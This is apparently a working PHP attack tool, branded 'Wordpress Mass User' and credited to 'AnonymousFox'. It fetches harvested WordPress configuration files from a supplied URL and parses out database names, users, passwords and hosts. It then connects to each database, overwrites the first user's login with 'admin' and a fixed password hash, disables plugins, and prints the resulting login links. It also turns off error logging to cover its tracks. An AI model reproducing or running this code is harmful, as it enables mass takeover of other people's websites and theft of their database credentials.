<?php echo ' <html><head><title>Wordpress Mass User</title><style type="text/css">
body {
background-color:#000000;
background-image:url("https://i.imgur.com/hLcQCBx.gif");
background-repeat:repeat;
margin-top:20px;
font-family:"Agency FB";
font-size:12pt; color:#ffffff;
	}
	input,textarea,select{
	font-weight: bold;
	color: #cccccc;
	dashed #ffffff;
	border: 1px
	solid #2C2C2C;
	background-color: #080808
	}
	a {
		background-color: #151515;
		vertical-align: bottom;
		color: #d0c8c8;
		text-decoration: none;
		font-size: 20px;
		margin: 8px;
		padding: 6px;
		border: thin solid #000000;
	}
	a:hover {
		background-color: #080808;
		vertical-align: bottom;
		color: #333;
		text-decoration: none;
		font-size: 20px;
		margin: 8px;
		padding: 6px;
		border: #d53b3b;
	}
	.style1 {
		text-align: center;
		color: #d9910e;
	}
	.style2 {
		color: #d9910e;
		font-weight: bold;
		
			}
	.style3 {
		color: #d9910e;
			}
	textarea{
	background:transparent;
	border: 1px solid #2d2b2b;
	width: 80%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	font-family:Homenaje;
	color: #ffffff;
	font-size:13px;
	}
	</style></head> ';
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$pass = md5($Password);
function GrabUrl($url, $type) {
    $urlArray = array();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $regex = '|<a.*?href="(.*?)"|';
    preg_match_all($regex, $result, $parts);
    $links = $parts[1];
    foreach ($links as $link) {
        array_push($urlArray, $link);
    }
    curl_close($ch);
    foreach ($urlArray as $value) {
        $lol = "$url$value";
        if (preg_match("#$type#is", $lol)) {
            echo "<urlconfig>$lol</urlconfig>
";
        }
    }
}
function AnonymousFox($param, $kata1, $kata2) {
    if (strpos($param, $kata1) === FALSE) return FALSE;
    if (strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
echo "<center>
<font color='white' size='40'>Wordpress Mass User</font>

<table width='100%' cellspacing='0' cellpadding='0' class='tb1' >
<td height='10' align='left' class='td1'></td></tr><tr><td
width='100%' align='center' valign='top' rowspan='1'><font
color='red' face='comic sans ms'size='1'><b>
<font color=#ff9933>
</font><br><font color=white>--==[[Greetz to]]==--</font><br><font  color=#ff9933>-=| AnonymousFox |=-<br>
</table>
</table> <div align=center><font color=#ff9933 font size=5><marquee behavior='scroll' direction='left' scrollamount='2' scrolldelay='5' width='70%'><p>
<span  class='footerlink'> ####### Coded By AnonymousFox #######</span>
</marquee><br><br></font></div>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' size='50' placeholder='http://url.com/priv8_sym404/'><br><br>
<input type='submit' style='width: 150px;' name='gass' value='Submit!!'>
</form></center>";
echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'], 'wordpress');
echo "</textarea><br><br>
<input type='submit' style='width: 200px;' name='edittitle' value='Submit!!'>
</form></center>";
if ($_POST['edittitle']) {
    $title = htmlspecialchars($_POST['title']);
    $id = $_POST['id'];
    $content = $_POST['content'];
    $postname = $_POST['name'];
    function anucurl($sites) {
        $ch = curl_init($sites);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIESESSION, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    $link = explode("
", $_POST['link']);
    foreach ($link as $dir_config) {
        $config = anucurl($dir_config);
        preg_match("/define.*DB_NAME.*\"(.*)\"/", $config, $m);
        $dbname1 = $m[1];
        preg_match('/define.*DB_NAME.*\'(.*)\'/', $config, $m);
        $dbname2 = $m[1];
        $dbname = ("$dbname1$dbname2");
        preg_match("/define.*DB_USER.*\"(.*)\"/", $config, $m);
        $dbuser1 = $m[1];
        preg_match('/define.*DB_USER.*\'(.*)\'/', $config, $m);
        $dbuser2 = $m[1];
        $dbuser = ("$dbuser1$dbuser2");
        preg_match("/define.*DB_PASSWORD.*\"(.*)\"/", $config, $m);
        $dbpass1 = $m[1];
        preg_match('/define.*DB_PASSWORD.*\'(.*)\'/', $config, $m);
        $dbpass2 = $m[1];
        $dbpass = ("$dbpass1$dbpass2");
        preg_match("/define.*DB_HOST.*\"(.*)\"/", $config, $m);
        $dbhost1 = $m[1];
        preg_match('/define.*DB_HOST.*\'(.*)\'/', $config, $m);
        $dbhost2 = $m[1];
        $dbhost = ("$dbhost1$dbhost2");
        preg_match("/\$table_prefix.+?\"(.+?)\".+/", $config, $m);
        $dbprefix0 = $m[1];
        $dbprefix1 = AnonymousFox($config, "table_prefix  = '", "'");
        $dbprefix2 = AnonymousFox($config, "table_prefix = '", "'");
        $dbprefix3 = AnonymousFox($config, "table_prefix= '", "'");
        $dbprefix4 = AnonymousFox($config, "table_prefix   = '", "'");
        $dbprefix = ("$dbprefix0$dbprefix1$dbprefix2$dbprefix3$dbprefix4");
        $connect = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
        if ($connect) {
            $query1 = mysqli_query($connect, "select * from " . $dbprefix . "options where option_name='siteurl'");
            while ($siteurl = mysqli_fetch_array($query1)) {
                $site_url = $siteurl['option_value'];
            }
            $Username = "admin";
            $pass = "b7b1dc541ba98a721295e3d2a9079e7a";
            $Password = "covid19";
            $query3 = mysqli_query($connect, "UPDATE " . $dbprefix . "options SET option_value = 'a:19' WHERE option_name = 'active_plugins'");
            $query2 = mysqli_query($connect, "update " . $dbprefix . "users set user_login='$Username',user_pass='$pass' where id='1'");
            if ($query2) {
                echo "<center><span class=f><a href='$site_url/wp-login.php#$Username@$Password' target='_blank'>$site_url/wp-login.php#$Username@$Password</a><br></span></center>
";
            }
        }
    }
}
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
echo '</html>';